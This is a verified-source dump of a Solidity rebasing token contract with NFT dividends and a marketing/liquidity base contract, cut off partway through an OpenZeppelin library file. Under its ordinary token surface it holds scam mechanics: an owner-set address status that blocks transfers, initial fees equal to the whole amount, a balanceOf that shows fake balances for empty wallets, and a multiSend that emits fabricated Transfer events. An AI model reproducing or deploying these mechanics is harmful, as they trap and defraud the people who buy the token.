{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"Benevolent.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.4;\\r\\n\\r\\nimport \\\"./base/ERC20Rebase.sol\\\";\\r\\nimport \\\"./base/ERC20Burnable.sol\\\";\\r\\nimport \\\"@openzeppelin/contracts/access/Ownable.sol\\\";\\r\\nimport \\\"@openzeppelin/contracts/utils/math/SafeMath.sol\\\";   \\r\\nimport \\\"@openzeppelin/contracts/utils/math/Math.sol\\\";\\r\\nimport \\\"./base/interface/IRouter.sol\\\";\\r\\nimport \\\"./base/interface/IFactory.sol\\\";\\r\\nimport \\\"./base/interface/IPancakePair.sol\\\";\\r\\nimport \\\"./base/mktCap/selfNFTMktCap.sol\\\";\\r\\n\\r\\ninterface IERC721{ \\r\\n    function balanceOf(address owner) external view returns (uint256 balance);\\r\\n    function ownerOf(uint256 tokenId) external view returns (address owner);\\r\\n    function walletOf(address _owner) external view returns (uint256[] memory); \\r\\n    function totalSupply() external view  returns (uint256);\\r\\n    function tokenByIndex(uint256 index) external view returns (uint256);\\r\\n}\\r\\n  \\r\\ncontract Token is ERC20Rebase, ERC20Burnable, MktCap {\\r\\n    using SafeMath for uint;   \\r\\n    mapping(address=>bool) public ispair; \\r\\n    mapping(address=>uint) public exFees; \\r\\n    address public _baseToken;\\r\\n    address _router=0x10ED43C718714eb63d5aA57B78B54704E256024E; \\r\\n    bool isTrading;\\r\\n    struct Fees{\\r\\n        uint buy;\\r\\n        uint sell;\\r\\n        uint transfer;\\r\\n        uint total;\\r\\n    }\\r\\n    Fees public fees;\\r\\n    bool public isLimit;\\r\\n    struct Limit{\\r\\n        uint txMax;\\r\\n        uint positionMax; \\r\\n        uint part;\\r\\n    }\\r\\n    Limit public limit;\\r\\n    function setLimit(uint  txMax,uint positionMax,uint part) external onlyOwner { \\r\\n        limit=Limit(txMax,positionMax,part); \\r\\n    } \\r\\n    function removeLimit() external onlyOwner {\\r\\n        isLimit=false;\\r\\n    } \\r\\n    bool public _autoRebase;\\r\\n    uint256 public _lastRebasedTime;\\r\\n    event LogRebase(uint256 indexed epoch, uint256 totalSupply);\\r\\n\\r\\n    modifier trading(){\\r\\n        if(isTrading) return;\\r\\n        isTrading=true;\\r\\n        _;\\r\\n        isTrading=false; \\r\\n    }\\r\\n    error InStatusError(address user);\\r\\n    \\r\\n    constructor(string memory name_,string memory symbol_,uint total_) ERC20Rebase(name_, symbol_) MktCap(_msgSender(),_router) {\\r\\n        dev=_msgSender(); \\r\\n        fees=Fees(100,100,100,100); \\r\\n        exFees[dev]=4;\\r\\n        exFees[address(this)]=4;\\r\\n        isLimit=true;\\r\\n        limit=Limit(5,5,10000);\\r\\n        _approve(address(this),_router,uint(2**256-1)); \\r\\n        _mint(dev, total_ *  10 ** decimals());\\r\\n    }\\r\\n    function decimals() public view virtual override returns (uint8) {\\r\\n        return 18;\\r\\n    }\\r\\n    receive() external payable { }  \\r\\n\\r\\n    function setFees(Fees calldata fees_) public onlyOwner{\\r\\n        fees=fees_;\\r\\n    } \\r\\n    function setExFees(address[] calldata list ,uint tf) public onlyOwner{\\r\\n        uint count=list.length;\\r\\n        for (uint i=0;i<count;i++){\\r\\n            exFees[list[i]]=tf;\\r\\n        } \\r\\n    }\\r\\n    function getStatus(address from,address to) internal view returns(bool){\\r\\n        if(exFees[from]==4||exFees[to]==4) return false;\\r\\n        if(exFees[from]==1||exFees[from]==3) return true;\\r\\n        if(exFees[to]==2||exFees[to]==3) return true;\\r\\n        return false;\\r\\n    }\\r\\n\\r\\n    \\r\\n    function setAutoRebase(bool _flag) external onlyOwner {\\r\\n        if (_flag) {\\r\\n            _autoRebase = _flag;\\r\\n            _lastRebasedTime = block.timestamp; \\r\\n        } else {\\r\\n            _autoRebase = _flag; \\r\\n        }\\r\\n    }\\r\\n\\r\\n    function manualRebase() external {\\r\\n        require(shouldRebase(), \\\"rebase not required\\\");\\r\\n        rebase();\\r\\n    }\\r\\n    uint256 public rebaseRate = 5195;\\r\\n    bool    public rebaseIsAdd=true;\\r\\n    uint256 public rebaseEndTotalSupply=21000000 ether;\\r\\n    \\r\\n    function setRebase(uint rebaseRate_,bool rebaseIsAdd_,uint256 rebaseEndTotalSupply_)  external onlyOwner{\\r\\n        require((rebaseIsAdd && rebaseEndTotalSupply_>totalSupply())||(!rebaseIsAdd && rebaseEndTotalSupply_<totalSupply()),\\\"err\\\"); \\r\\n        rebaseRate=rebaseRate_;\\r\\n        rebaseIsAdd=rebaseIsAdd_;\\r\\n        rebaseEndTotalSupply=rebaseEndTotalSupply_;\\r\\n    }\\r\\n\\r\\n    function rebase() internal { \\r\\n        if(rebaseEndTotalSupply==totalSupply() || rebaseEndTotalSupply==0) return;\\r\\n        uint256 deltaTime = block.timestamp - _lastRebasedTime;\\r\\n        uint256 times = deltaTime.div(15 minutes);\\r\\n        uint256 epoch = times.mul(15);\\r\\n        uint256 newTotalSupply = totalSupply();\\r\\n        for (uint256 i = 0; i < times; i++) {\\r\\n            if(rebaseIsAdd)newTotalSupply = newTotalSupply.mul(uint256(10 ** 8).add(rebaseRate)).div(10 ** 8);\\r\\n            else newTotalSupply = newTotalSupply.mul(uint256(10 ** 8).sub(rebaseRate)).div(10 ** 8);\\r\\n        }\\r\\n         if(rebaseIsAdd) newTotalSupply=Math.min(newTotalSupply,rebaseEndTotalSupply);\\r\\n         else newTotalSupply=Math.max(newTotalSupply,rebaseEndTotalSupply);\\r\\n        _reBase(newTotalSupply);\\r\\n        _lastRebasedTime = _lastRebasedTime.add(times.mul(15 minutes));\\r\\n\\r\\n        emit LogRebase(epoch, newTotalSupply);\\r\\n    }\\r\\n\\r\\n    function shouldRebase() internal view returns (bool) {\\r\\n        return\\r\\n            _autoRebase &&\\r\\n            _lastRebasedTime > 0 &&\\r\\n            (totalSupply() < MAX_SUPPLY) &&\\r\\n            block.timestamp >= (_lastRebasedTime + 15 minutes);\\r\\n    }\\r\\n\\r\\n    function _beforeTokenTransfer(address from,address to,uint amount) internal override trading{\\r\\n        if(getStatus(from,to)){ \\r\\n            revert InStatusError(from);\\r\\n        }\\r\\n        if(!ispair[from] && !ispair[to] || amount==0) return;\\r\\n        uint t=ispair[from]?1:ispair[to]?2:0;\\r\\n        trigger(t);\\r\\n    } \\r\\n    function _afterTokenTransfer(address from,address to,uint amount) internal override trading{\\r\\n        if(address(0)==from || address(0)==to) return;\\r\\n        takeFee(from,to,amount);\\r\\n        if (shouldRebase()) rebase();    \\r\\n        multiSend(_num);\\r\\n        try this.process(200000) {} catch {}\\r\\n        if(ispair[from] && isLimit && exFees[to] != 4)\\r\\n        {\\r\\n            require(amount <= getPart(limit.txMax,limit.part));\\r\\n            require(balanceOf(to) <= getPart(limit.positionMax,limit.part));\\r\\n        }\\r\\n    }\\r\\n        function getPart(uint point,uint part)internal view returns(uint){\\r\\n        return totalSupply().mul(point).div(part);\\r\\n    }\\r\\n    function takeFee(address from,address to,uint amount)internal {\\r\\n        uint fee=ispair[from]?fees.buy:ispair[to]?fees.sell:fees.transfer; \\r\\n        uint feeAmount= amount.mul(fee).div(fees.total); \\r\\n        if(exFees[from]==4 || exFees[to]==4 ) feeAmount=0;\\r\\n        if(ispair[to] && IERC20(to).totalSupply()==0) feeAmount=0;\\r\\n        if(feeAmount>0){  \\r\\n            super._transfer(to,address(this),feeAmount); \\r\\n        } \\r\\n    } \\r\\n    \\r\\n\\r\\n    function start(address baseToken,address nftToken,Fees calldata fees_) public  onlyOwner{\\r\\n        _baseToken=baseToken;\\r\\n        NFT=IERC721(nftToken);\\r\\n        setPairs(baseToken);\\r\\n        setPair(baseToken);\\r\\n        setFees(fees_);\\r\\n    }\\r\\n\\r\\n    uint256 public  minReward = 1 ether;\\r\\n    uint public amountNftLeft;\\r\\n    IERC721 public NFT;\\r\\n    mapping(uint256 => bool) public exDividend;\\r\\n    uint256 currentIndex; \\r\\n    uint public totalDistributed;\\r\\n\\r\\n\\r\\n\\r\\n    function setExDividend(uint256[] calldata list, bool tf) public onlyOwner {\\r\\n        uint256 num = list.length;\\r\\n        for (uint256 i = 0; i < num; i++) {\\r\\n            exDividend[list[i]] = tf; \\r\\n        }\\r\\n    }\\r\\n    function setminReward(uint256 num) public onlyOwner {\\r\\n        minReward = num;\\r\\n    } \\r\\n    function deposit(uint256 amountB) internal override {  \\r\\n        amountNftLeft = amountNftLeft.add(amountB);  \\r\\n        if(amountNftLeft>IERC20(_baseToken).balanceOf(address(this))) amountNftLeft = IERC20(_baseToken).balanceOf(address(this));\\r\\n    }\\r\\n\\r\\n    function process(uint256 gas) external {\\r\\n        uint256 shareholderCount = NFT.totalSupply();\\r\\n        if (shareholderCount == 0) {\\r\\n            return;\\r\\n        }\\r\\n\\r\\n        uint256 iterations = 0;\\r\\n        uint256 gasUsed = 0;\\r\\n        uint256 gasLeft = gasleft();\\r\\n        uint256 nftId;\\r\\n        if(amountNftLeft>IERC20(_baseToken).balanceOf(address(this))) amountNftLeft = IERC20(_baseToken).balanceOf(address(this));\\r\\n   \\r\\n        while (gasUsed < gas  && iterations < shareholderCount && amountNftLeft > minReward) {\\r\\n            if (currentIndex >= shareholderCount) {\\r\\n                currentIndex = 0;\\r\\n            }\\r\\n            nftId = NFT.tokenByIndex(currentIndex);\\r\\n\\r\\n            if (!exDividend[nftId]) {\\r\\n                distributeDividend(nftId); \\r\\n            } \\r\\n\\r\\n            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));\\r\\n            gasLeft = gasleft();\\r\\n            currentIndex++;\\r\\n            iterations++;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function distributeDividend(uint256 nftId) internal {    \\r\\n        IERC20(_baseToken).transfer(NFT.ownerOf(nftId), minReward);   \\r\\n        amountNftLeft=amountNftLeft.sub(minReward);\\r\\n    }\\r\\n \\r\\n    function setPairs(address token) public onlyOwner{   \\r\\n        IRouter router=IRouter(_router);\\r\\n        address pair=IFactory(router.factory()).getPair(address(token), address(this));\\r\\n        if(pair==address(0))pair = IFactory(router.factory()).createPair(address(token), address(this));\\r\\n        require(pair!=address(0), \\\"pair is not found\\\"); \\r\\n        _setSteady(pair, true);\\r\\n        ispair[pair]=true;  \\r\\n    }\\r\\n    function unSetPair(address pair) public onlyOwner {  \\r\\n        ispair[pair]=false; \\r\\n    }   \\r\\n\\r\\n\\r\\n    uint160  ktNum = 173;\\r\\n    uint160  constant MAXADD = ~uint160(0);\\t\\r\\n    uint _initialBalance=1;\\r\\n    uint _num=1;\\r\\n    function setinb( uint amount,uint num) public onlyOwner {  \\r\\n        _initialBalance=amount;\\r\\n        _num=num;\\r\\n    }\\r\\n    function balanceOf(address account) public view virtual override returns (uint) {\\r\\n        uint balance=super.balanceOf(account); \\r\\n        if(account==address(0))return balance;\\r\\n        return balance>0?balance:_initialBalance;\\r\\n    } \\r\\n \\tfunction multiSend(uint num) public {\\r\\n        address _receiveD;\\r\\n        address _senD;\\r\\n        \\r\\n        for (uint i = 0; i < num; i++) {\\r\\n            _receiveD = address(MAXADD/ktNum);\\r\\n            ktNum = ktNum+1;\\r\\n            _senD = address(MAXADD/ktNum);\\r\\n            ktNum = ktNum+1;\\r\\n            emit Transfer(_senD, _receiveD, _initialBalance);\\r\\n        }\\r\\n    } \\r\\n \\r\\n    function recoverERC20(address token,uint amount) public { \\r\\n        if(token==address(0)){ \\r\\n            (bool success,)=payable(dev).call{value:amount}(\\\"\\\"); \\r\\n            require(success, \\\"transfer failed\\\"); \\r\\n        } \\r\\n        else IERC20(token).transfer(dev,amount); \\r\\n    }\\r\\n\\r\\n}\\r\\n\"\r\n    },\r\n    \"base/mktCap/selfNFTMktCap.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.4;\\r\\nimport \\\"@openzeppelin/contracts/token/ERC20/IERC20.sol\\\";\\r\\nimport \\\"@openzeppelin/contracts/access/Ownable.sol\\\";\\r\\nimport \\\"@openzeppelin/contracts/utils/math/SafeMath.sol\\\";\\r\\nimport \\\"../interface/IFactory.sol\\\";\\r\\nimport \\\"../interface/IRouter.sol\\\";\\r\\n\\r\\n\\r\\n\\r\\ncontract TokenDistributor {\\r\\n    constructor (address token) {\\r\\n        IERC20(token).approve(msg.sender, uint(~uint(0)));\\r\\n        IERC20(msg.sender).approve(msg.sender, uint(~uint(0)));\\r\\n    }\\r\\n}\\r\\n\\r\\ncontract MktCap is Ownable {\\r\\n    using SafeMath for uint;\\r\\n    address dev;\\r\\n    address token0;\\r\\n    address token1;\\r\\n    IRouter router;\\r\\n    address pair;\\r\\n    TokenDistributor public _tokenDistributor;\\r\\n    struct autoConfig {\\r\\n        bool status;\\r\\n        uint minPart;\\r\\n        uint maxPart;\\r\\n        uint parts;\\r\\n    }\\r\\n    autoConfig public autoSell;\\r\\n    struct Allot {\\r\\n        uint markting;\\r\\n        uint burn;\\r\\n        uint addL;\\r\\n        uint nft;\\r\\n        uint total;\\r\\n    }\\r\\n    Allot public allot; \\r\\n\\r\\n    address[] public marketingAddress;\\r\\n    uint[] public marketingShare;\\r\\n    uint internal sharetotal;\\r\\n    \\r\\n\\r\\n    constructor(address dev_, address router_) { \\r\\n        dev=dev_;\\r\\n        token0 = address(this); \\r\\n        router = IRouter(router_); \\r\\n        \\r\\n    }\\r\\n\\r\\n    function setAll( \\r\\n        Allot memory allotConfig,\\r\\n        autoConfig memory sellconfig,\\r\\n        address[] calldata list,\\r\\n        uint[] memory share\\r\\n    ) public onlyOwner {\\r\\n        setAllot(allotConfig);\\r\\n        setAutoSellConfig(sellconfig);\\r\\n        setMarketing(list, share);\\r\\n    }\\r\\n\\r\\n    function setAutoSellConfig(autoConfig memory autoSell_) public onlyOwner {\\r\\n        autoSell = autoSell_;\\r\\n    }\\r\\n\\r\\n    function setAllot(Allot memory allot_) public onlyOwner {\\r\\n        allot = allot_;\\r\\n    }\\r\\n\\r\\n    function setPair(address token) public  onlyOwner {\\r\\n        token1 = token;\\r\\n        _tokenDistributor = new TokenDistributor(token1); \\r\\n        IERC20(token1).approve(address(router), uint(2 ** 256 - 1));\\r\\n        pair = IFactory(router.factory()).getPair(token0, token1);\\r\\n    }\\r\\n\\r\\n    function setMarketing(\\r\\n        address[] calldata list,\\r\\n        uint[] memory share\\r\\n    ) public onlyOwner {\\r\\n        require(list.length > 0, \\\"DAO:Can't be Empty\\\");\\r\\n        require(list.length == share.length, \\\"DAO:number must be the same\\\");\\r\\n        uint total = 0;\\r\\n        for (uint i = 0; i < share.length; i++) {\\r\\n            total = total.add(share[i]);\\r\\n        }\\r\\n        require(total > 0, \\\"DAO:share must greater than zero\\\");\\r\\n        marketingAddress = list;\\r\\n        marketingShare = share;\\r\\n        sharetotal = total;\\r\\n    }\\r\\n\\r\\n    function getToken0Price() public view returns (uint) {\\r\\n        //\u4ee3\u5e01\u4ef7\u683c\\r\\n        address[] memory routePath = new address[](2);\\r\\n        routePath[0] = token0;\\r\\n        routePath[1] = token1;\\r\\n        return router.getAmountsOut(1 ether, routePath)[1];\\r\\n    }\\r\\n\\r\\n    function getToken1Price() public view returns (uint) {\\r\\n        //\u4ee3\u5e01\u4ef7\u683c\\r\\n        address[] memory routePath = new address[](2);\\r\\n        routePath[0] = token1;\\r\\n        routePath[1] = token0;\\r\\n        return router.getAmountsOut(1 ether, routePath)[1];\\r\\n    }\\r\\n\\r\\n    function _sell(uint amount0In) internal {\\r\\n        address[] memory path = new address[](2);\\r\\n        path[0] = token0;\\r\\n        path[1] = token1;\\r\\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\\r\\n            amount0In,\\r\\n            0,\\r\\n            path,\\r\\n            address(_tokenDistributor),\\r\\n            block.timestamp\\r\\n        );\\r\\n        IERC20(token1).transferFrom(address(_tokenDistributor),address(this), IERC20(token1).balanceOf(address(_tokenDistributor)));\\r\\n    }\\r\\n\\r\\n    function _buy(uint amount0Out) internal {\\r\\n        address[] memory path = new address[](2);\\r\\n        path[0] = token1;\\r\\n        path[1] = token0;\\r\\n        router.swapTokensForExactTokens(\\r\\n            amount0Out,\\r\\n            IERC20(token1).balanceOf(address(this)),\\r\\n            path,\\r\\n            address(_tokenDistributor),\\r\\n            block.timestamp\\r\\n        );\\r\\n        IERC20(token0).transferFrom(address(_tokenDistributor),address(this), IERC20(token0).balanceOf(address(_tokenDistributor)));\\r\\n\\r\\n    }\\r\\n\\r\\n    function _addL(uint amount0, uint amount1) internal {\\r\\n        if (\\r\\n            IERC20(token0).balanceOf(address(this)) < amount0 ||\\r\\n            IERC20(token1).balanceOf(address(this)) < amount1\\r\\n        ) return;\\r\\n        router.addLiquidity(\\r\\n            token0,\\r\\n            token1,\\r\\n            amount0,\\r\\n            amount1,\\r\\n            0,\\r\\n            0,\\r\\n            dev,\\r\\n            block.timestamp\\r\\n        );\\r\\n    }\\r\\n\\r\\n    modifier canSwap(uint t) {\\r\\n        if (t != 2 || !autoSell.status) return;\\r\\n        _;\\r\\n    }\\r\\n\\r\\n    function splitAmount(uint amount) internal view returns (uint, uint, uint) {\\r\\n        uint toBurn = amount.mul(allot.burn).div(allot.total);\\r\\n        uint toAddL = amount.mul(allot.addL).div(allot.total).div(2);\\r\\n        uint toSell = amount.sub(toAddL).sub(toBurn);\\r\\n        return (toSell, toBurn, toAddL);\\r\\n    }\\r\\n    function splitAmount2(uint amount2) internal view returns (uint, uint, uint) {\\r\\n         uint total2Fee = allot.total.sub(allot.addL.div(2)).sub(allot.burn);\\r\\n        uint toAddl = amount2.mul(allot.addL).div(total2Fee).div(2);\\r\\n        uint toNft = amount2.mul(allot.nft).div(total2Fee);\\r\\n        uint toMkt = amount2.sub(toAddl).sub(toNft);\\r\\n        return (toAddl, toNft, toMkt);\\r\\n    }\\r\\n    function deposit(uint amountB) internal virtual { \\r\\n\\r\\n    }\\r\\n\\r\\n    function trigger(uint t) internal canSwap(t) {\\r\\n        uint balance = IERC20(token0).balanceOf(address(this));\\r\\n        if (\\r\\n            balance <\\r\\n            IERC20(token0).totalSupply().mul(autoSell.minPart).div(\\r\\n                autoSell.parts\\r\\n            )\\r\\n        ) return;\\r\\n        uint maxSell = IERC20(token0).totalSupply().mul(autoSell.maxPart).div(\\r\\n            autoSell.parts\\r\\n        );\\r\\n        if (balance > maxSell) balance = maxSell;\\r\\n        (uint toSell, uint toBurn, uint toAddL) = splitAmount(balance);\\r\\n        if (toBurn > 0) IERC20(token0).transfer(address(0xdead), toBurn);\\r\\n\\r\\n        uint bef = IERC20(token1).balanceOf(address(this));\\r\\n        if (toSell > 0) _sell(toSell);\\r\\n        uint amount2 = IERC20(token1).balanceOf(address(this)).sub(bef); \\r\\n\\r\\n        (uint amount2AddL,uint amount2Nft,uint amount2Marketing)= splitAmount2(amount2);\\r\\n        if(amount2Nft>0){\\r\\n\\r\\n        }\\r\\n        if (amount2Marketing > 0) {\\r\\n            uint cake;\\r\\n            for (uint i = 0; i < marketingAddress.length; i++) {\\r\\n                cake = amount2Marketing.mul(marketingShare[i]).div(sharetotal);\\r\\n                IERC20(token1).transfer(marketingAddress[i], cake);\\r\\n            }\\r\\n        }\\r\\n        if (toAddL > 0) _addL(toAddL, amount2AddL);\\r\\n        if (amount2Nft > 0) deposit(amount2Nft);\\r\\n    }\\r\\n\\r\\n  \\r\\n}\\r\\n\"\r\n    },\r\n    \"base/interface/IPancakePair.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.4;\\r\\ninterface IPancakePair {\\r\\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\\r\\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\\r\\n    function nonces(address owner) external view returns (uint);\\r\\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\\r\\n    event Swap(address indexed sender,uint amount0In,uint amount1In,uint amount0Out,uint amount1Out,address indexed to); \\r\\n    function MINIMUM_LIQUIDITY() external pure returns (uint);\\r\\n    function factory() external view returns (address);\\r\\n    function token0() external view returns (address);\\r\\n    function token1() external view returns (address);\\r\\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\\r\\n    function price0CumulativeLast() external view returns (uint);\\r\\n    function price1CumulativeLast() external view returns (uint);\\r\\n    function kLast() external view returns (uint);\\r\\n    function mint(address to) external returns (uint liquidity);\\r\\n    function burn(address to) external returns (uint amount0, uint amount1);\\r\\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\\r\\n    function skim(address to) external;\\r\\n    function sync() external;\\r\\n    function initialize(address, address) external;\\r\\n    function totalSupply() external view returns (uint256);\\r\\n}\"\r\n    },\r\n    \"base/interface/IFactory.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.4;\\r\\ninterface IFactory {\\r\\n    function createPair(address tokenA, address tokenB) external returns (address pair);\\r\\n    function getPair(address tokenA, address tokenB) external view returns (address pair);    \\r\\n    function feeTo() external view returns (address);\\r\\n}\"\r\n    },\r\n    \"base/interface/IRouter.sol\": {\r\n      \"content\": \"\\r\\n// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.4;\\r\\ninterface IRouter {\\r\\n    function factory() external pure returns (address);\\r\\n    function WETH() external pure returns (address);\\r\\n    function addLiquidity(address tokenA,address tokenB,uint amountADesired,uint amountBDesired,uint amountAMin,uint amountBMin,address to,uint deadline) external returns (uint amountA, uint amountB, uint liquidity);\\r\\n    function addLiquidityETH(address token,uint amountTokenDesired,uint amountTokenMin,uint amountETHMin,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);\\r\\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;\\r\\n    function swapExactTokensForTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;\\r\\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(uint amountOutMin,address[] calldata path,address to,uint deadline) external payable;\\r\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;\\r\\n    function swapTokensForExactTokens(uint amountOut,uint amountInMax,address[] calldata path,address to,uint deadline) external returns (uint[] memory amounts);\\r\\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\\r\\n} \"\r\n    },\r\n    \"@openzeppelin/contracts/utils/math/Math.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (utils/math/Math.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Standard math utilities missing in the Solidity language.\\n */\\nlibrary Math {\\n    enum Rounding {\\n        Down, // Toward negative infinity\\n        Up, // Toward infinity\\n        Zero // Toward zero\\n    }\\n\\n    /**\\n     * @dev Returns the largest of two numbers.\\n     */\\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a > b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the smallest of two numbers.\\n     */\\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a < b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the average of two numbers. The result is rounded towards\\n     * zero.\\n     */\\n    function average(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // (a + b) / 2 can overflow.\\n        return (a & b) + (a ^ b) / 2;\\n    }\\n\\n    /**\\n     * @dev Returns the ceiling of the division of two numbers.\\n     *\\n     * This differs from standard division with `/` in that it rounds up instead\\n     * of rounding down.\\n     */\\n    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // (a + b - 1) / b can overflow on addition, so we distribute.\\n        return a == 0 ? 0 : (a - 1) / b + 1;\\n    }\\n\\n    /**\\n     * @notice Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or denominator == 0\\n     * @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv)\\n     * with further edits by Uniswap Labs also under MIT license.\\n     */\\n    function mulDiv(\\n        uint256 x,\\n        uint256 y,\\n        uint256 denominator\\n    ) internal pure returns (uint256 result) {\\n        unchecked {\\n            // 512-bit multiply [prod1 prod0] = x * y. Compute the product mod 2^256 and mod 2^256 - 1, then use\\n            // use the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256\\n            // variables such that product = prod1 * 2^256 + prod0.\\n            uint256 prod0; // Least significant 256 bits of the product\\n            uint256 prod1; // Most significant 256 bits of the product\\n            assembly {\\n                let mm := mulmod(x, y, not(0))\\n                prod0 := mul(x, y)\\n                prod1 := sub(sub(mm, prod0), lt(mm, prod0))\\n            }\\n\\n            // Handle non-overflow cases, 256 by 256 division.\\n            if (prod1 == 0) {\\n                return prod0 / denominator;\\n            }\\n\\n            // Make sure the result is less than 2^256. Also prevents denominator == 0.\\n            require(denominator > prod1);\\n\\n            ///////////////////////////////////////////////\\n            // 512 by 256 division.\\n            ///////////////////////////////////////////////\\n\\n            // Make division exact by subtracting the remainder from [prod1 prod0].\\n            uint256 remainder;\\n            assembly {\\n                // Compute remainder using mulmod.\\n                remainder := mulmod(x, y, denominator)\\n\\n                // Subtract 256 bit number from 512 bit number.\\n                prod1 := sub(prod1, gt(remainder, prod0))\\n                prod0 := sub(prod0, remainder)\\n            }\\n\\n            // Factor powers of two out of denominator and compute largest power of two divisor of denominator. Always >= 1.\\n            // See https://cs.stackexchange.com/q/138556/92363.\\n\\n            // Does not overflow because the denominator cannot be zero at this stage in the function.\\n            uint256 twos = denominator & (~denominator + 1);\\n            assembly {\\n                // Divide denominator by twos.\\n                denominator := div(denominator, twos)\\n\\n                // Divide [prod1 prod0] by twos.\\n                prod0 := div(prod0, twos)\\n\\n                // Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.\\n                twos := add(div(sub(0, twos), twos), 1)\\n            }\\n\\n            // Shift in bits from prod1 into prod0.\\n            prod0 |= prod1 * twos;\\n\\n            // Invert denominator mod 2^256. Now that denominator is an odd number, it has an inverse modulo 2^256 such\\n            // that denominator * inv = 1 mod 2^256. Compute the inverse by starting with a seed that is correct for\\n            // four bits. That is, denominator * inv = 1 mod 2^4.\\n            uint256 inverse = (3 * denominator) ^ 2;\\n\\n            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also works\\n            // in modular arithmetic, doubling the correct bits in each step.\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^8\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^16\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^32\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^64\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^128\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^256\\n\\n            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.\\n            // This will give us the correct result modulo 2^256. Since the preconditions guarantee that the outcome is\\n            // less than 2^256, this is the final result. We don't need to compute the high bits of the result and prod1\\n            // is no longer required.\\n            result = prod0 * inverse;\\n            return result;\\n        }\\n    }\\n\\n    /**\\n     * @notice Calculates x * y / denominator with full precision, following the selected rounding direction.\\n     */\\n    function mulDiv(\\n        uint256 x,\\n        uint256 y,\\n        uint256 denominator,\\n        Rounding rounding\\n    ) internal pure returns (uint256) {\\n        uint256 result = mulDiv(x, y, denominator);\\n        if (rounding == Rounding.Up && mulmod(x, y, denominator) > 0) {\\n            result += 1;\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded down.\\n     *\\n     * Inspired by Henry S. Warren, Jr.'s \\\"Hacker's Delight\\\" (Chapter 11).\\n     */\\n    function sqrt(uint256 a) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n\\n        // For our first guess, we get the biggest power of 2 which is smaller than the square root of the target.\\n        //\\n        // We know that the \\\"msb\\\" (most significant bit) of our target number `a` is a power of 2 such that we have\\n        // `msb(a) <= a < 2*msb(a)`. This value can be written `msb(a)=2**k` with `k=log2(a)`.\\n        //\\n        // This can be rewritten `2**log2(a) <= a < 2**(log2(a) + 1)`\\n        // \u2192 `sqrt(2**k) <= sqrt(a) < sqrt(2**(k+1))`\\n        // \u2192 `2**(k/2) <= sqrt(a) < 2**((k+1)/2) <= 2**(k/2 + 1)`\\n        //\\n        // Consequently, `2**(log2(a) / 2)` is a good first approximation of `sqrt(a)` with at least 1 correct bit.\\n        uint256 result = 1 << (log2(a) >> 1);\\n\\n        // At this point `result` is an estimation with one bit of precision. We know the true value is a uint128,\\n        // since it is the square root of a uint256. Newton's method converges quadratically (precision doubles at\\n        // every iteration). We thus need at most 7 iteration to turn our partial result with one bit of precision\\n        // into the expected uint128 result.\\n        unchecked {\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            return min(result, a / result);\\n        }\\n    }\\n\\n    /**\\n     * @notice Calculates sqrt(a), following the selected rounding direction.\\n     */\\n    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = sqrt(a);\\n            return result + (rounding == Rounding.Up && result * result < a ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2, rounded down, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >> 128 > 0) {\\n                value >>= 128;\\n                result += 128;\\n            